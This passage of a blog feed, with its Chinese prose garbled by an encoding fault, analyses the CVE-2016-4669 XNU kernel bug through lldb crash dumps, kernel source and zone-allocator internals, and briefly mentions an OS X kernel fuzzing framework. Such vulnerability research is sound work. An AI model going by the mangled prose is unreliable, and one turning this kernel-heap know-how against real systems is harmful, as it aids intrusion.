<p><a href="http://ho.ax/posts/2012/02/resolving-kernel-symbols/" target="_blank" rel="external">http://ho.ax/posts/2012/02/resolving-kernel-symbols/</a></p>
<p>[3]PassiveFuzzFrameworkOSX</p>
<p><a href="https://github.com/SilverMoonSecurity/PassiveFuzzFrameworkOSX" target="_blank" rel="external">https://github.com/SilverMoonSecurity/PassiveFuzzFrameworkOSX</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p>â€‹    å‰æ®µæ—¶é—´<code>TREND</code>çš„ç ”ç©¶å‘˜åœ¨<code>POC</code>å®‰å…¨å¤§ä¼šä¸Šä»‹ç»äº†ä¸€æ¬¾<code>OS X</code>ç³»ç»Ÿä¸Šé¢çš„<code>Fuzz</code>æ¡†æ¶ï¼Œå¹¶ä¸”å¼€æºäº†ã€‚<code>github</code>ç‚¹<a href="https://github.com/SilverMoonSecurity/PassiveFuzzFrameworkOSX">è¿™é‡Œ</a>ã€‚æˆ‘è®°å¾—çœ‹é›ªå¥½åƒå·²ç»æœ‰ç¿»è¯‘æˆä¸­æ–‡ç‰ˆçš„PPTï¼Œæ‰¾äº†ä¸€ä¸‹æ²¡æ‰¾åˆ°:-(ã€‚ç½‘ä¸Šèƒ½æ‰¾åˆ°çš„ä¿¡æ¯ï¼Œè¿™é‡Œå°±ä¸å¤è¿°äº†ï¼Œæœ‰å…´è¶£çš„è¯»è€…å¯ä»¥è‡ªè¡Œé˜…è¯»ã€‚</p>
<p>â€‹    ç®€å•æ¥è¯´å°±æ˜¯é€šè¿‡å†…æ ¸æ‰©å±•ï¼Œå¯¹ä¸€ç³»åˆ—å†…æ ¸å‡½æ•°è¿›è¡Œ<code>inline hook</code>ï¼Œåœ¨è¿™äº›è¢«<code>hook</code>çš„å‡½æ•°è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œå¯¹å‚æ•°è¿›è¡Œä¸€äº›éšæœºçš„ä¿®æ”¹ã€‚æ‰€ä»¥å«åšè¢«åŠ¨å¼Fuzzï¼Œè€Œä¸æ˜¯ä¼ ç»Ÿçš„ä¸»åŠ¨è°ƒç”¨å†…æ ¸å‡½æ•°ä¼ å…¥ä¸åŒçš„å‚æ•°ã€‚</p>]]>
    
    </summary>
    
      <category term="XNU" scheme="http://turingh.github.io/tags/XNU/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-4669åˆ†æä¸è°ƒè¯•]]></title>
    <link href="http://turingh.github.io/2016/11/07/CVE-2016-4669%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/"/>
    <id>http://turingh.github.io/2016/11/07/CVE-2016-4669åˆ†æä¸è°ƒè¯•/</id>
    <published>2016-11-07T19:57:00.000Z</published>
    <updated>2016-11-08T02:58:14.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p>æœ¬æ–‡è®°å½•äº†å¯¹<a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-4669" target="_blank" rel="external">CVE-2016-4669</a>çš„<a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=244431" target="_blank" rel="external">POC</a>çš„è°ƒè¯•ä¸­é‡åˆ°çš„é—®é¢˜ï¼Œä»¥åŠç›¸å…³çŸ¥è¯†çš„æ•´ç†ï¼Œè¯¥æ¼æ´çš„åŸå§‹æŠ¥å‘Šåœ¨<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=882&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">è¿™é‡Œ</a>ã€‚åŸå§‹æŠ¥å‘Šä¸­çš„å†…å®¹ï¼Œæœ¬æ–‡ä¸åœ¨å¤è¿°ã€‚</p>
<a id="more"></a>
<h1 id="0x01_åŸºç¡€çŸ¥è¯†">0x01 åŸºç¡€çŸ¥è¯†</h1><h2 id="1-1_MIG">1.1 MIG</h2><p><code>MIG</code>æ˜¯<code>Mach</code>ç³»ç»Ÿä¸­ä½¿ç”¨çš„ä¸€ç§è‡ªåŠ¨ç”Ÿæˆä»£ç çš„è„šæœ¬è¯­è¨€ï¼Œä»¥<code>.def</code>ç»“å°¾ã€‚é€šè¿‡å·¥å…·ç”Ÿæˆçš„ä»£ç åˆ†ä¸º<code>xxx.h</code>,<code>xxxClient.c</code>å’Œ<code>xxxServer.c</code>ä¸‰ä¸ªéƒ¨åˆ†ï¼Œåœ¨ç¼–è¯‘åº”ç”¨å±‚ç¨‹åºæ—¶ï¼Œå’Œ<code>xxxClient.c</code>æ–‡ä»¶ä¸€èµ·ç¼–è¯‘ï¼Œä½¿ç”¨è‡ªåŠ¨ç”Ÿæˆçš„ä»£ç ã€‚è¿™é‡Œå°±æ˜¯<code>poc</code>ä¸­çš„<code>taskUser.c</code>å’Œ<code>task.h</code>ã€‚</p>
<p>ç›¸å…³çš„ç»†èŠ‚å¯ä»¥æŸ¥çœ‹ã€ŠMac OS X Internals: A Systems Approachã€‹ä¸€ä¹¦çš„<strong>Section 9.6</strong>ä¸­çš„æè¿°ã€‚</p>
<h2 id="1-2_å†…æ ¸ä¸­çš„å†…å­˜ç®¡ç†">1.2 å†…æ ¸ä¸­çš„å†…å­˜ç®¡ç†</h2><p>æè¿°å†…æ ¸ä¸­å †å†…å­˜çš„ç®¡ç†ç›¸å…³å†…å®¹å¯ä»¥å‚è€ƒè¿™ä¸ªslidesï¼Œæ¯”è¾ƒç®€å•æ˜äº†çš„è¯´æ¸…æ¥šäº†å†…æ ¸ä¸­å†…å­˜çš„åŸºæœ¬ç»“æ„<a href="http://gsec.hitb.org/materials/sg2016/D2%20-%20Stefan%20Esser%20-%20iOS%2010%20Kernel%20Heap%20Revisited.pdf" target="_blank" rel="external">iOS 10 Kernel Heap Revisited</a>ã€‚</p>
<h1 id="0x02_è°ƒè¯•è¿‡ç¨‹">0x02 è°ƒè¯•è¿‡ç¨‹</h1><h2 id="2-1_coreæ–‡ä»¶åˆ†æ">2.1 coreæ–‡ä»¶åˆ†æ</h2><p>åœ¨è¿è¡Œ<code>POC</code>ä¹‹åç³»ç»Ÿå´©æºƒï¼ŒæŸ¥çœ‹å´©æºƒçš„è°ƒç”¨æ ˆã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) bt&#10;* thread #1: tid = 0x0000, 0xffffff80049c0f01 kernel`hw_lock_to + 17, stop reason = signal SIGSTOP&#10;  * frame #0: 0xffffff80049c0f01 kernel`hw_lock_to + 17&#10;    frame #1: 0xffffff80049c5cb3 kernel`usimple_lock(l=0xdeadbeefdeadbef7) + 35 at locks_i386.c:365 [opt]&#10;    frame #2: 0xffffff80048c991c kernel`ipc_port_release_send [inlined] lck_spin_lock(lck=0xdeadbeefdeadbef7) + 44 at locks_i386.c:269 [opt]&#10;    frame #3: 0xffffff80048c9914 kernel`ipc_port_release_send(port=0xdeadbeefdeadbeef) + 36 at ipc_port.c:1567 [opt]&#10;    frame #4: 0xffffff80048e22d3 kernel`mach_ports_register(task=&#60;unavailable&#62;, memory=0xffffff800aad4270, portsCnt=3) + 547 at ipc_tt.c:1097 [opt]&#10;    frame #5: 0xffffff8004935b3f kernel`_Xmach_ports_register(InHeadP=0xffffff800b2c297c, OutHeadP=0xffffff800e5c4b90) + 111 at task_server.c:647 [opt]&#10;    frame #6: 0xffffff80048df2c3 kernel`ipc_kobject_server(request=0xffffff800b2c2900) + 259 at ipc_kobject.c:340 [opt]&#10;    frame #7: 0xffffff80048c28f8 kernel`ipc_kmsg_send(kmsg=&#60;unavailable&#62;, option=&#60;unavailable&#62;, send_timeout=0) + 184 at ipc_kmsg.c:1443 [opt]&#10;    frame #8: 0xffffff80048d26a5 kernel`mach_msg_overwrite_trap(args=&#60;unavailable&#62;) + 197 at mach_msg.c:474 [opt]&#10;    frame #9: 0xffffff80049b8eca kernel`mach_call_munger64(state=0xffffff800f7e6540) + 410 at bsd_i386.c:560 [opt]&#10;    frame #10: 0xffffff80049ecd86 kernel`hndl_mach_scall64 + 22</span><br></pre></td></tr></table></figure>
<p>ç®€å•çš„åˆ†æä¸€ä¸‹è°ƒç”¨æ ˆ</p>
<p><code>_Xmach_ports_register</code>å°±æ˜¯<code>taskSever.c</code>ä¸­å¯¹åº”çš„å‡½æ•°ã€‚</p>
<p>å‡ºé—®é¢˜çš„æœ€å…³é”®çš„æ˜¯<code>#4</code>ï¼Œ<code>#5</code>ä¸¤ä¸ªæ ˆã€‚</p>
<p>é€šè¿‡åˆ†æ<code>mach_ports_register</code>å‡½æ•°çš„æºç </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">...</span><br><span class="line">     </span><br><span class="line">for (i = 0; i &lt; TASK_PORT_REGISTER_MAX; i++) &#123;</span><br><span class="line">	ipc_port_t old;</span><br><span class="line"></span><br><span class="line">	old = task-&gt;itk_registered[i];</span><br><span class="line">	task-&gt;itk_registered[i] = ports[i];</span><br><span class="line">	ports[i] = old;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">itk_unlock(task);</span><br><span class="line"></span><br><span class="line">for (i = 0; i &lt; TASK_PORT_REGISTER_MAX; i++)</span><br><span class="line">	if (IP_VALID(ports[i]))</span><br><span class="line">		ipc_port_release_send(ports[i]); &lt;--#5bå´©æºƒçš„åœ°æ–¹</span><br><span class="line"></span><br><span class="line">    if (portsCnt != 0)</span><br><span class="line">	kfree(memory,&lt;--é‡Šæ”¾memory</span><br><span class="line">	      (vm_size_t) (portsCnt * sizeof(mach_port_t)));</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæ˜¯å¯¹<code>ports</code>çš„æ•°ç»„ä¸­çš„å‚æ•°è°ƒç”¨<code>ipc_port_release_send</code>ï¼Œå‡ºå‘çš„å´©æºƒã€‚</p>
<p>æŸ¥çœ‹<code>ports</code>ä¸­çš„å€¼ï¼Œå¦‚ä¸‹ï¼Œ</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(lldb) f 4</span><br><span class="line">kernel was compiled with optimization - stepping may behave oddly; variables may not be available.</span><br><span class="line">frame #4: 0xffffff80048e22d3 kernel`mach_ports_register(task=&lt;unavailable&gt;, memory=0xffffff800aad4270, portsCnt=3) + 547 at ipc_tt.c:1097 [opt]</span><br><span class="line">(lldb) p ports</span><br><span class="line">(ipc_port_t [3]) $0 = &#123;</span><br><span class="line">  [0] = 0xffffff800b890680</span><br><span class="line">  [1] = 0xdeadbeefdeadbeef</span><br><span class="line">  [2] = 0x6c7070612e6d6f63</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å› ä¸ºæºç ä¸­ä¼šä½¿ç”¨<code>kfree</code>å»é‡Šæ”¾<code>memory</code>,æ¥ä¸‹æ¥å°±å»åŠ¨æ€çš„è°ƒè¯•å§ã€‚</p>
<h1 id="2-2_åŠ¨æ€è°ƒè¯•">2.2 åŠ¨æ€è°ƒè¯•</h1><h3 id="2-2-1_mach_ports_register">2.2.1 mach_ports_register</h3><p>å› ä¸º<code>mach_ports_register</code>è¿™ä¸ªå‡½æ•°åœ¨ä¸€äº›å…¶ä»–æµç¨‹ä¸­éƒ½ä¼šæœ‰æœ‰è°ƒç”¨ï¼Œå¦‚æœç›´æ¥åœ¨å†…æ ¸ä¸­çš„<code>mach_ports_register</code>ä¸‹æ–­ç‚¹ï¼Œä¼šæœ‰å¾ˆå¤šå…¶ä»–çš„è°ƒç”¨ä¼šè¢«æ–­åˆ°ï¼Œè¿™é‡Œæˆ‘çš„åšæ³•æ˜¯å…ˆç”¨<code>lldb</code>å¯åŠ¨<code>r3gister</code>ç¨‹åºå¹¶æ–­åœ¨<code>mach_ports_register</code>å¤„ï¼Œå¹¶è¿è¡Œã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#10140; lldb r3gister&#10;(lldb) target create &#34;r3gister&#34;&#10;Current executable set to &#39;r3gister&#39; (x86_64).&#10;(lldb) b mach_ports_register&#10;Breakpoint 1: 2 locations.&#10;(lldb) r&#10;Process 425 launched: &#39;/Users/mrh/mach_port_register/r3gister&#39; (x86_64)&#10;Process 425 stopped&#10;* thread #1: tid = 0x10fd, 0x00000001000012a7 r3gister`mach_ports_register(target_task=259, init_port_set=0x00007fff5fbffa98, init_port_setCnt=3) + 39 at taskUser.c:690, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 1.1&#10;    frame #0: 0x00000001000012a7 r3gister`mach_ports_register(target_task=259, init_port_set=0x00007fff5fbffa98, init_port_setCnt=3) + 39 at taskUser.c:690&#10;   687 &#9;&#9;&#9;Reply Out;&#10;   688 &#9;&#9;&#125; Mess;&#10;   689&#10;-&#62; 690 &#9;&#9;Request *InP = &#38;Mess.In;&#10;   691 &#9;&#9;Reply *Out0P = &#38;Mess.Out;&#10;   692&#10;   693 &#9;&#9;mach_msg_return_t msg_result;</span><br></pre></td></tr></table></figure>
<p>å½“å·²ç»æ–­åœ¨è¿™é‡Œçš„æ—¶å€™ï¼Œåœ¨å†…æ ¸ä¸Šä¸‹æ–­ç‚¹ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) b mach_ports_register &#10;Breakpoint 1: where = kernel.development`mach_ports_register + 40 at ipc_tt.c:1060, address = 0xffffff8009686568&#10;(lldb) c&#10;Process 1 resuming</span><br></pre></td></tr></table></figure>
<p>åœ¨å†…æ ¸çš„æ–­ç‚¹è®¾ç½®æˆåŠŸåï¼Œç»§ç»­æ‰§è¡Œ<code>r3gister</code>,å°±ä¼šè§¦å‘å†…æ ¸ä¸­çš„æ–­ç‚¹ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) bt&#10;* thread #1: tid = 0x0001, 0xffffff8009686568 kernel.development`mach_ports_register(task=0xffffff8012933640, memory=0xffffff800f7da660, portsCnt=3) + 40 at ipc_tt.c:1060, stop reason = breakpoint 1.1&#10;  * frame #0: 0xffffff8009686568 kernel.development`mach_ports_register(task=0xffffff8012933640, memory=0xffffff800f7da660, portsCnt=3) + 40 at ipc_tt.c:1060 [opt]&#10;    frame #1: 0xffffff80096e43ff kernel.development`_Xmach_ports_register(InHeadP=0xffffff8013c7937c, OutHeadP=0xffffff8014efaf90) + 111 at task_server.c:647 [opt]&#10;    frame #2: 0xffffff8009683443 kernel.development`ipc_kobject_server(request=0xffffff8013c79300) + 259 at ipc_kobject.c:340 [opt]&#10;    frame #3: 0xffffff800965ef03 kernel.development`ipc_kmsg_send(kmsg=&#60;unavailable&#62;, option=&#60;unavailable&#62;, send_timeout=0) + 211 at ipc_kmsg.c:1443 [opt]&#10;    frame #4: 0xffffff8009675985 kernel.development`mach_msg_overwrite_trap(args=&#60;unavailable&#62;) + 197 at mach_msg.c:474 [opt]&#10;    frame #5: 0xffffff800977f000 kernel.development`mach_call_munger64(state=0xffffff801278eb60) + 480 at bsd_i386.c:560 [opt]&#10;    frame #6: 0xffffff80097b4de6 kernel.development`hndl_mach_scall64 + 22</span><br></pre></td></tr></table></figure>
<h3 id="2-2-2_memoryçš„zoneåˆ†æ">2.2.2 memoryçš„zoneåˆ†æ</h3><p>é€šè¿‡<code>lldb</code>è°ƒè¯•å™¨æŸ¥çœ‹<code>memory</code>å¤„çš„å†…å­˜ï¼Œå¦‚ä¸‹ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read --format x --size 8 memory&#10;0xffffff800f7da660: 0xffffff80140e7580 0xdeadbeefdeadbeef&#10;0xffffff800f7da670: 0xffffff800f7dab00 0xfacadea23d1ec085&#10;0xffffff800f7da680: 0x0000000000000000 0xffffffff00000000&#10;0xffffff800f7da690: 0x0000000000000000 0x0000000000001000</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡ä¸€ç‚¹å°æŠ€å·§å¯ä»¥æŸ¥çœ‹<code>memory</code>æ˜¯åœ¨å“ªä¸€ä¸ª<code>zone</code>ä¸Šåˆ†é…çš„ï¼Œä¹Ÿå¯ä»¥ç»§ç»­è·Ÿè¸ªä»£ç ï¼Œåœ¨åé¢çš„<code>kfree</code>ä¸­è°ƒç”¨<code>zfree</code>å‡½æ•°çš„æµç¨‹ä¸­ä¼šå‡ºç°ç›¸å…³çš„è½¬æ¢ä»£ç ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (zone-&gt;use_page_list) &#123;</span><br><span class="line">		<span class="keyword">struct</span> zone_page_metadata *page_meta = get_zone_page_metadata((<span class="keyword">struct</span> zone_free_element *)addr);</span><br><span class="line">		<span class="keyword">if</span> (zone != page_meta-&gt;zone) &#123;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>å…¶å®å°±æ˜¯<code>get_zone_page_metadata</code>è¿™ä¸ªå‡½æ•°çš„å®ç°äº†ï¼Œè¿™é‡Œçš„<code>addr</code>å°±æ˜¯<code>memory</code>ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p *(zone_page_metadata*)0xffffff80140e7000&#10;(zone_page_metadata) $1 = &#123;&#10;  pages = &#123;&#10;    next = 0xffffff8012db4000&#10;    prev = 0xffffff801109f000&#10;  &#125;&#10;  elements = 0xffffff80140e76d0&#10;  zone = 0xffffff800f480ba0&#10;  alloc_count = 12&#10;  free_count = 1&#10;&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨æŸ¥çœ‹<code>zone</code>çš„å…·ä½“æ•°æ®ï¼Œå¯ä»¥å¾—çŸ¥<code>memory</code>è¢«åˆ†é…åœ¨å“ªä¸ª<code>zone</code>å½“ä¸­ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#10;zone_name = 0xffffff8009d35bac &#34;kalloc.16&#34;&#10;...</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥å¾—çŸ¥ï¼Œå› ä¸º<code>port</code>çš„ä¸ªæ•°è¢«è®¾ç½®ä¸º1ä¸ªï¼Œæ‰€ä»¥åªéœ€è¦ä¸€ä¸ªæŒ‡é’ˆï¼Œè€Œåœ¨è°ƒç”¨<code>kfree</code>çš„æ—¶å€™ï¼Œ<code>kfree</code>çš„<code>size</code>æ˜¯3ä¸ªæŒ‡é’ˆçš„é•¿åº¦ï¼Œæ‰€ä»¥æ˜¯è¯•å›¾åœ¨<code>kalloc.24</code>ä¸­é‡Šæ”¾å†…å­˜,è¿™å°±ä¼šé€ æˆé”™è¯¯çš„<code>kfree</code>ï¼Œä½†æ˜¯è‹¹æœæœ‰ä¸€æ®µç¥å¥‡çš„ä»£ç ï¼Œå°è¯•ä¿®å¤è¿™ä¸ªé—®é¢˜ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (zone-&gt;use_page_list) &#123;</span><br><span class="line">		<span class="keyword">struct</span> zone_page_metadata *page_meta = get_zone_page_metadata((<span class="keyword">struct</span> zone_free_element *)addr);</span><br><span class="line">		<span class="keyword">if</span> (zone != page_meta-&gt;zone) &#123;</span><br><span class="line">			<span class="comment">/*</span><br><span class="line">			 * Something bad has happened. Someone tried to zfree a pointer but the metadata says it is from</span><br><span class="line">			 * a different zone (or maybe it's from a zone that doesn't use page free lists at all). We can repair</span><br><span class="line">			 * some cases of this, if:</span><br><span class="line">			 * 1) The specified zone had use_page_list, and the true zone also has use_page_list set. In that case</span><br><span class="line">			 *    we can swap the zone_t</span><br><span class="line">			 * 2) The specified zone had use_page_list, but the true zone does not. In this case page_meta is garbage,</span><br><span class="line">			 *    and dereferencing page_meta-&gt;zone might panic.</span><br><span class="line">			 * To distinguish the two, we enumerate the zone list to match it up.</span><br><span class="line">			 * We do not handle the case where an incorrect zone is passed that does not have use_page_list set,</span><br><span class="line">			 * even if the true zone did have this set.</span><br><span class="line">			 */</span></span><br><span class="line">			<span class="keyword">zone_t</span> fixed_zone = <span class="literal">NULL</span>;</span><br><span class="line">			<span class="keyword">int</span> fixed_i, max_zones;</span><br><span class="line"></span><br><span class="line">			simple_lock(&amp;all_zones_lock);</span><br><span class="line">			max_zones = num_zones;</span><br><span class="line">			fixed_zone = first_zone;</span><br><span class="line">			simple_unlock(&amp;all_zones_lock);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (fixed_i=<span class="number">0</span>; fixed_i &lt; max_zones; fixed_i++, fixed_zone = fixed_zone-&gt;next_zone) &#123;</span><br><span class="line">				<span class="keyword">if</span> (fixed_zone == page_meta-&gt;zone &amp;&amp; fixed_zone-&gt;use_page_list) &#123;</span><br><span class="line">					<span class="comment">/* we can fix this */</span></span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"Fixing incorrect zfree from zone %s to zone %s\n"</span>, zone-&gt;zone_name, fixed_zone-&gt;zone_name);</span><br><span class="line">					zone = fixed_zone;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>ç”¨ä»£ç ä¿®å¤æ•°æ®ç»“æ„çš„é”™è¯¯æœ¬èº«å°±æ˜¯ä¸€ä»¶å¾ˆå±é™©çš„äº‹æƒ…ï¼Œè€Œè¿™é‡Œæ›´å±é™©çš„æ˜¯å¦‚æœä¸èƒ½ä¿®å¤è¿™ä¸ªé”™è¯¯çš„è¯ï¼Œä»£ç æ²¡æœ‰ä»»ä½•æŠ¥é”™æˆ–æç¤ºï¼Œè¿™é‡Œå°±ä¼šæœ‰å¾ˆå¤šéšæ‚£ã€‚</p>
<h2 id="2-2-3_å †å†…å­˜ç®€å•åˆ†æ">2.2.3 å †å†…å­˜ç®€å•åˆ†æ</h2><p>è¿™é‡Œç®€å•çš„åˆ†æä¸€ä¸‹å†…æ ¸ä¸­å †çš„æ•°æ®ç»“æ„ï¼Œå†™åˆ°è¿™é‡Œçš„æ—¶å€™æˆ‘é‡å¯äº†ä¸€æ¬¡è™šæ‹Ÿæœºå’Œè°ƒè¯•å™¨ï¼Œæ‰€ä»¥åœ°å€å’Œä¹‹å‰ä¼šå¯¹ä¸ä¸Šã€‚</p>
<p>è¿™ä¸€æ¬¡çœ‹åˆ°çš„<code>kalloc.16</code>çš„<code>zone</code>å¦‚ä¸‹ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p *(zone*)0xffffff80213caea0&#10;(zone) $5 = &#123;&#10;  free_elements = 0x0000000000000000&#10;  pages = &#123;&#10;    any_free_foreign = &#123;&#10;      next = 0xffffff80213caea8&#10;      prev = 0xffffff80213caea8&#10;    &#125;&#10;    all_free = &#123;&#10;      next = 0xffffff80213caeb8&#10;      prev = 0xffffff80213caeb8&#10;    &#125;&#10;    intermediate = &#123;&#10;      next = 0xffffff8025e06000&#10;      prev = 0xffffff8025706000&#10;    &#125;&#10;    all_used = &#123;&#10;      next = 0xffffff8025226000&#10;      prev = 0xffffff8025d29000&#10;    &#125;&#10;  &#125;&#10;  count = 29951&#10;  countfree = 37&#10;  lock_attr = (lck_attr_val = 0)&#10;  lock = &#123;&#10;    lck_mtx_sw = &#123;&#10;      lck_mtxd = &#123;&#10;        lck_mtxd_owner = 0&#10;         = &#123;&#10;           = &#123;&#10;            lck_mtxd_waiters = 0&#10;            lck_mtxd_pri = 0&#10;            lck_mtxd_ilocked = 0&#10;            lck_mtxd_mlocked = 0&#10;            lck_mtxd_promoted = 0&#10;            lck_mtxd_spin = 0&#10;            lck_mtxd_is_ext = 0&#10;            lck_mtxd_pad3 = 0&#10;          &#125;&#10;          lck_mtxd_state = 0&#10;        &#125;&#10;        lck_mtxd_pad32 = 4294967295&#10;      &#125;&#10;      lck_mtxi = &#123;&#10;        lck_mtxi_ptr = 0x0000000000000000&#10;        lck_mtxi_tag = 0&#10;        lck_mtxi_pad32 = 4294967295&#10;      &#125;&#10;    &#125;&#10;  &#125;&#10;  lock_ext = &#123;&#10;    lck_mtx = &#123;&#10;      lck_mtx_sw = &#123;&#10;        lck_mtxd = &#123;&#10;          lck_mtxd_owner = 0&#10;           = &#123;&#10;             = &#123;&#10;              lck_mtxd_waiters = 0&#10;              lck_mtxd_pri = 0&#10;              lck_mtxd_ilocked = 0&#10;              lck_mtxd_mlocked = 0&#10;              lck_mtxd_promoted = 0&#10;              lck_mtxd_spin = 0&#10;              lck_mtxd_is_ext = 0&#10;              lck_mtxd_pad3 = 0&#10;            &#125;&#10;            lck_mtxd_state = 0&#10;          &#125;&#10;          lck_mtxd_pad32 = 0&#10;        &#125;&#10;        lck_mtxi = &#123;&#10;          lck_mtxi_ptr = 0x0000000000000000&#10;          lck_mtxi_tag = 0&#10;          lck_mtxi_pad32 = 0&#10;        &#125;&#10;      &#125;&#10;    &#125;&#10;    lck_mtx_grp = 0x0000000000000000&#10;    lck_mtx_attr = 0&#10;    lck_mtx_pad1 = 0&#10;    lck_mtx_deb = (type = 0, pad4 = 0, pc = 0, thread = 0)&#10;    lck_mtx_stat = 0&#10;    lck_mtx_pad2 = ([0] = 0, [1] = 0)&#10;  &#125;&#10;  cur_size = 479808&#10;  max_size = 531441&#10;  elem_size = 16&#10;  alloc_size = 4096&#10;  page_count = 119&#10;  sum_count = 235587&#10;  exhaustible = 0&#10;  collectable = 1&#10;  expandable = 1&#10;  allows_foreign = 0&#10;  doing_alloc_without_vm_priv = 0&#10;  doing_alloc_with_vm_priv = 0&#10;  waiting = 0&#10;  async_pending = 0&#10;  zleak_on = 0&#10;  caller_acct = 0&#10;  doing_gc = 0&#10;  noencrypt = 0&#10;  no_callout = 0&#10;  async_prio_refill = 0&#10;  gzalloc_exempt = 0&#10;  alignment_required = 0&#10;  use_page_list = 1&#10;  _reserved = 0&#10;  index = 12&#10;  next_zone = 0xffffff80213ca120&#10;  zone_name = 0xffffff801ef3af0d &#34;kalloc.16&#34;&#10;  zleak_capture = 0&#10;  zp_count = 0&#10;  prio_refill_watermark = 0&#10;  zone_replenish_thread = 0x0000000000000000&#10;  gz = &#123;&#10;    gzfc_index = 0&#10;    gzfc = 0xdeadbeefdeadbeef&#10;  &#125;&#10;&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå°±ä¸»è¦çš„åˆ†æä¸€ä¸‹<code>page</code>å’Œ<code>page</code>å†…çš„å†…å­˜çš„åˆ†å¸ƒã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p *(zone*)0xffffff80213caea0&#10;(zone) $5 = &#123;&#10;  free_elements = 0x0000000000000000&#10;  pages = &#123;&#10;    any_free_foreign = &#123;&#10;      next = 0xffffff80213caea8&#10;      prev = 0xffffff80213caea8&#10;    &#125;&#10;    all_free = &#123;&#10;      next = 0xffffff80213caeb8&#10;      prev = 0xffffff80213caeb8&#10;    &#125;&#10;    intermediate = &#123;&#10;      next = 0xffffff8025e06000&#10;      prev = 0xffffff8025706000&#10;    &#125;&#10;    all_used = &#123;&#10;      next = 0xffffff8025226000&#10;      prev = 0xffffff8025d29000&#10;    &#125;&#10;  &#125;&#10;  ...</span><br></pre></td></tr></table></figure>
